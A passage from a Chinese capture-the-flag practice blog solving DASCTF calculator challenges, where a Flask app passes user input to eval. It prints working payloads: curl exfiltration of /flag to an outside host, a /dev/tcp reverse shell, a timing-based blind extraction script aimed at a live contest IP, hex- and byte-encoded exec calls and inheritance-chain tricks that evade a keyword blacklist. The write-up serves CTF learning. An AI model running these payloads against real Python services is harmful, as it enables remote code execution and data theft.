+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"or"</span> <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>只过滤了 <code>or</code> ,因为不是直接回显，所以考虑盲注，但是也可以反弹shell，curl外带</p>
+<p>curl外带</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234</span>|<span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">'cat /flag | curl http://1.1.1.1:2333 --data-binary @-'</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/6月刷题记录/image-20200628174548750.png" alt="image-20200628174548750"></p>
+<p>反弹shell</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">1234</span>|<span class="selector-tag">open</span>(<span class="string">'/tmp/c.sh'</span>,<span class="string">'w'</span>)<span class="selector-class">.write</span>(<span class="string">'/bin/bash -i &gt; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1'</span>),<span class="selector-tag">os</span><span class="selector-class">.system</span>(<span class="string">'/bin/bash /tmp/c.sh'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = <span class="string">"abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"DASCTF"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">    url = <span class="string">"http://183.129.189.60:10026/"</span></span><br><span class="line">    data=&#123;<span class="string">'input'</span>:<span class="string">'1234|os.system(\'cat /flag|grep &#123;&#125; &amp;&amp; sleep 2\')'</span>.format(payload + i)&#125;</span><br><span class="line">    print(data)</span><br><span class="line">    first = time.time()</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    second = time.time()</span><br><span class="line">    offset = second-first</span><br><span class="line">    <span class="keyword">if</span> offset &gt; <span class="number">2</span>:</span><br><span class="line">        payload = payload+i</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>后面题目下线了，听说是被<code>os.system()</code>打穿了</p>
+<h3 id="9-DASCTF-六月赛-简单的计算题2"><a href="#9-DASCTF-六月赛-简单的计算题2" class="headerlink" title="9.[DASCTF 六月赛]简单的计算题2"></a>9.<strong>[DASCTF 六月赛]简单的计算题2</strong></h3><p>其他和1一样，但过滤更严格了</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.<span class="keyword">method</span><span class="operator"> == </span>'POST':</span><br><span class="line">        input = request.form<span class="literal">['<span class="identifier">input</span>']</span></span><br><span class="line">        create_question = create<span class="literal">()</span></span><br><span class="line">        input_question = session.get('question')</span><br><span class="line">        session<span class="literal">['<span class="identifier">question</span>']</span> = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question<span class="operator"> == </span>None:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"Invalid session please try again!"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"hack"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        calc_str = input_question + <span class="string">"="</span> + str(input)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(calc_str)))</span><br><span class="line">        except Exception <span class="keyword">as</span> ex:</span><br><span class="line">            calc_result = <span class="string">"Invalid"</span></span><br><span class="line">        return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="params">calc_result</span>,<span class="params">question</span>=<span class="params">create_question</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>后面爬下来的黑名单</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">black_list</span> = [ <span class="string">'os'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'system'</span>,<span class="string">'if'</span>, <span class="string">'for'</span>,<span class="string">'subprocess'</span>, <span class="string">'file'</span>, <span class="string">'builtins'</span>,<span class="string">'compile'</span>,<span class="string">'execfile'</span>,<span class="string">'from_pyfile'</span>,<span class="string">'config'</span>,<span class="string">'local'</span>,<span class="string">'self'</span>,<span class="string">'enter'</span>,<span class="string">'%'</span>,<span class="string">'or'</span>,<span class="string">'ls'</span>,<span class="string">'sys'</span>,<span class="string">'globals'</span>,<span class="string">'read'</span>,<span class="string">'popen'</span>]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>但 <code>exec</code>没被禁所以和1一样，但 <code>exec</code>返回为空所以用<code>,</code>分割</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">"os.system('cat /flag | curl http://1.1.1.1:2333 --data-binary @-')"</span></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(ord(i))+<span class="string">','</span></span><br><span class="line">print(payload)</span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(hex(ord(i))).replace(<span class="string">"0x"</span>,<span class="string">""</span>).zfill(<span class="number">2</span>)</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,exec(<span class="string">'o'</span>+<span class="string">'s.sy'</span>+<span class="string">'stem("sleep 10")'</span>)  <span class="comment">//明显延时了</span></span><br><span class="line"><span class="number">1</span>,exec(bytes([<span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">32</span>, <span class="number">124</span>, <span class="number">32</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">45</span>, <span class="number">39</span>, <span class="number">41</span>]).decode()) <span class="comment">//curl外带</span></span><br><span class="line"><span class="number">1</span>,exec(bytes.fromhex(<span class="string">'6f732e73797374656d2827636174202f666c6167207c206375726c20687474703a2f2f312e312e312e313a32333333202d2d646174612d62696e61727920402d2729'</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>利用继承链</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],<span class="string">'__cla'</span>+<span class="string">'ss__'</span>),<span class="string">'__mr'</span>+<span class="string">'o__'</span>)[<span class="number">1</span>],<span class="string">'__subclas'</span>+<span class="string">'ses__'</span>)()[<span class="number">104</span>],<span class="string">'__init__'</span>),<span class="string">'__glob'</span>+<span class="string">'al'</span>+<span class="string">'s__'</span>)[<span class="string">'sy'</span>+<span class="string">'s'</span>],<span class="string">'mod'</span>+<span class="string">'ules'</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>],<span class="string">'sy'</span>+<span class="string">'ste'</span>+<span class="string">'m'</span>)(<span class="string">'l'</span>+<span class="string">'s'</span>)//绕waf</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符拼接</p>
+<p>  ​    </p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br><span class="line">exec(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2020/08/8月刷题记录/" rel="bookmark">8月刷题记录</a></div>
+      
+    </li>
+  
+  </ul>
+
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>0xCreed</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/" title="6月刷题记录">https://0xcreed.jxustctf.top/2020/06/6月刷题记录/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+		<div>
+		
+			
+				<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+			
+			
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/刷题/" rel="tag"> <i class="fa fa-tag"></i> 刷题</a>
+			   
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/05/NPUCTF2020-复现/" rel="next" title="NPUCTF-复现">
+                  <i class="fa fa-chevron-left"></i> NPUCTF-复现
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/06/nodejs学习/" rel="prev" title="nodejs学习">
+                  nodejs学习 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="comments"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+	
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+	
+	  </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-某师傅出的招新题"><span class="nav-number">1.1.</span> <span class="nav-text">1.某师傅出的招新题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-RoarCTF-2019-Easy-Calc"><span class="nav-number">1.2.</span> <span class="nav-text">2.[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-强网杯-2019-随便注"><span class="nav-number">1.3.</span> <span class="nav-text">3.[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-SUCTF-2019-CheckIn"><span class="nav-number">1.4.</span> <span class="nav-text">4.[SUCTF 2019]CheckIn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-护网杯-2018-easy-tornado"><span class="nav-number">1.5.</span> <span class="nav-text">5.[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">1.6.</span> <span class="nav-text">6.[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-HCTF-2018-admin"><span class="nav-number">1.7.</span> <span class="nav-text">7.[HCTF 2018]admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-DASCTF-六月赛-简单的计算题"><span class="nav-number">1.8.</span> <span class="nav-text">8.[DASCTF 六月赛]简单的计算题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-DASCTF-六月赛-简单的计算题2"><span class="nav-number">1.9.</span> <span class="nav-text">9.[DASCTF 六月赛]简单的计算题2</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/1.gif"
+      alt="0xCreed">
+  <p class="site-author-name" itemprop="name">0xCreed</p>
+  <div class="site-description" itemprop="description">Winter is coming</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/0xCreed" title="GitHub &rarr; https://github.com/0xCreed" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      推荐阅读
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/mwq1024/" title="https://www.cnblogs.com/mwq1024/" rel="noopener" target="_blank">旧博客</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https://www.leavesongs.com/" rel="noopener" target="_blank">离别歌</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://li1m.github.io/" title="https://li1m.github.io/" rel="noopener" target="_blank">LiM</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+	  
+	  
+	
+
+    </div>
+  </aside>
+
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+      <style>
+    #aplayer {
+        width: 50%;
+        margin: 0 auto;
+    }
+    @media screen and (max-device-width: 400px) {
+        #aplayer {
+            width: 100%;
+        }
+    }
+      </style>
+      <link rel="stylesheet" href="/dist/APlayer.min.css">
+      <div id="aplayer"></div>
+      <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+      <script type="text/javascript" src="/dist/music.js"></script>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0xCreed</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">242k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">3:40</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='120' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: '0eYM2A8pUSnA2EEyrujClGRN-MdYXbMMI',
+    appKey: 'BJmUYA3jJHocnfnm4LpPR9Ow',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname
+  });
+}, window.Valine);
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
